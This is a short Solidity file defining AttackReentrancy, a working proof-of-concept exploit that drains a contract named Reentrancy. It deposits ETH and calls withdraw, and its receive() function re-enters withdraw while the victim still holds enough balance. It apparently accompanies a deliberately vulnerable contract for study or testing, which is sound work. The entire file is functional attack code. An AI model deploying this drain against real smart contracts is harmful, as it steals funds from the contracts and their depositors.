// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "./Reentrancy.sol";

contract AttackReentrancy {
    Reentrancy public victim;
    uint256 public stealAmount;

    constructor(address _victim) {
        victim = Reentrancy(_victim);
    }
    
    function attack() external payable {
        require(msg.value > 0, "need ETH");
        stealAmount = msg.value;

        victim.deposit{value: msg.value}();

        victim.withdraw();
    }

    function getNetWorth() public view returns(uint256) {
        return address(this).balance; 
    }  

    receive() external payable {
        if(address(victim).balance >= stealAmount) {
            victim.withdraw();
        }
    }
}